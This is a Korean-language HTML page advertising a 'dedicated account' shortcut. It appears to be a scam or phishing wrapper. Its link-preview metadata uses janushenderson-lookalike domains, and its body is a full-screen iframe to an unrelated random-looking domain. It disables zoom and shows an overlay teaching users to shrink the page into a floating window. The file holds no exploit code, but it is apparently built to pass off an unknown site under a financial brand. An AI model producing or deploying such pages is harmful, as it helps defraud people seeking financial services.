<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover">

    <title>전용계좌 바로가기</title>
    <link rel="icon" type="image/png" href="../JHOne/app2.png">

    <meta property="og:title" content="전용계좌 바로가기">
    <meta property="og:description" content="클릭하여 전용 계좌 서비스를 이용하세요">
    <meta property="og:image" content="https://janushenderson.io/app/JHOne/app2.png">
    <meta property="og:url" content="https://janushenderson.one/app/handel/">
    <meta property="og:type" content="website">

    <style>
        html, body {
            margin: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            touch-action: manipulation;
            font-family: Arial, sans-serif;
        }

        iframe {
            display: block;
            width: 100%;
            height: 100dvh;
            border: none;
        }

        .top-guide {
            position: fixed;
            inset: 0;
            z-index: 99999;
            background: rgba(0, 0, 0, 0.38);
            pointer-events: none;
            animation: guideFadeOut 0.6s ease forwards;
            animation-delay: 4.4s;
        }

        .guide-box {
            position: absolute;
            top: 72px;
            right: 18px;
            max-width: 245px;
            padding: 14px 16px;
            border-radius: 12px;
            background: rgba(17, 17, 17, 0.88);
            color: #fff;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
            animation: guidePulse 1.2s ease-in-out infinite;
        }

        .guide-title {
            display: block;
            margin-bottom: 6px;
            font-size: 15px;
            font-weight: 700;
        }

        .guide-text {
            display: block;
            font-size: 13px;
            line-height: 1.45;
            color: #f0f0f0;
        }

        .guide-arrow {
            position: absolute;
            top: 18px;
            right: 28px;
            width: 72px;
            height: 72px;
            border-top: 4px solid #ffffff;
            border-right: 4px solid #ffffff;
            transform: rotate(-10deg);
            animation: arrowMove 0.9s ease-in-out infinite;
        }

        .guide-arrow::after {
            content: "";
            position: absolute;
            top: -9px;
            right: -9px;
            width: 14px;
            height: 14px;
            border-top: 4px solid #ffffff;
            border-right: 4px solid #ffffff;
            transform: rotate(45deg);
        }

        @keyframes arrowMove {
            0%, 100% {
                transform: translate(0, 0) rotate(-10deg);
                opacity: 0.75;
            }
            50% {
                transform: translate(8px, -8px) rotate(-10deg);
                opacity: 1;
            }
        }

        @keyframes guidePulse {
            0%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.025);
            }
        }

        @keyframes guideFadeOut {
            to {
                opacity: 0;
                visibility: hidden;
            }
        }
    </style>
</head>
<body>
    <iframe src="https://www.njvksdfa.com"></iframe>

    <div class="top-guide" id="top-guide">
        <div class="guide-arrow"></div>
        <div class="guide-box">
            <span class="guide-title">창을 작게 띄우기</span>
            <span class="guide-text">
                오른쪽 위의 아래쪽 화살표 아이콘을 누르면 창을 작게 띄울 수 있습니다.
                다시 열려면 오른쪽 플로팅 창을 눌러주세요.
            </span>
        </div>
    </div>

    <script>
        document.addEventListener("gesturestart", function (event) {
            event.preventDefault();
        });

        document.addEventListener("touchmove", function (event) {
            if (event.touches && event.touches.length > 1) {
                event.preventDefault();
            }
        }, { passive: false });

        setTimeout(function () {
            const guide = document.getElementById("top-guide");
            if (guide) {
                guide.remove();
            }
        }, 5200);
    </script>
</body>
</html>
